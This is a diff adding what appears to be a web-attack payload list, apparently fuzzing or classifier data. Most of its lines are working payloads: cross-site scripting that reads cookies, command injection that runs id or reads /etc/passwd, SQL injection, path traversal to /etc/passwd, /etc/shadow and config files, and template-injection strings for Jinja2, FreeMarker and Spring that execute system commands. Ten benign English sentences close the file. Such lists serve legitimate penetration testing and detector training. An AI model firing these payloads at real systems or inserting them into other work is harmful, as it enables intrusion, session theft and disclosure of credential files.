@@ -1,0 +1,55 @@
+<img src=”https://test.cyberspacekittens.com” onerror=alert(document.cookie);>
+onmouseover=alert(1)//
+(alert)(1)
+<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
+<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
+top[‘al\145rt’](1)
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<img src=x onerror=\x00"javascript:alert(1)">
+“><s”%2b”cript>alert(document.cookie)</script>
+|/usr/bin/id|
+cat /etc/hosts
+a);/usr/bin/id
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+$(`cat /etc/passwd`)
+echo -e \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat /et${neko}c/pas${poi}swd
+%0Acat%20/etc/passwd
+%0A/usr/bin/id%0A
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+-1 UNION SELECT 1 INTO @,@
+1' GROUP BY 1,2,--+
+' OR '1
+' AND id IS NULL; -- 
+1' ORDER BY 1--+
+SELECT%2520%2A%2520FROM%2520USERS
+1' union%0d%0aselect%0d%0a1
+%SEL%ECT * F%R%OM U%S%ERS
+SELECT cast('1' AS unsigned integer)
+SELECT(username)FROM(USERS)WHERE(username='netspi')
+../../../../etc/passwd
+../../../../var/www/html/conf.php
+../../controller.php
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%e0%40%aeetc%e0%40%aeshadow
+{{2*2}}[[3*3]]
+{{3*'3'}}
+<%= 3 * 3 %>
+${6*6}
+@(6+5)
+{{app.request.server.all|join(',')}}
+<%= File.open('/etc/passwd').read %>
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+A sample input to the web
+We try to make something new
+There are three thousands people on that island
+How to become a good businessman
+One thing that we need to consider is our data security
+There are a lot of trees down there
+Hello my name is Daniel and this is my friend
+if we stand under a lamp, we will see a shadow
+My mother want to buy apple, pear, orange, etc
+The selected player will be played from the beginning of the game
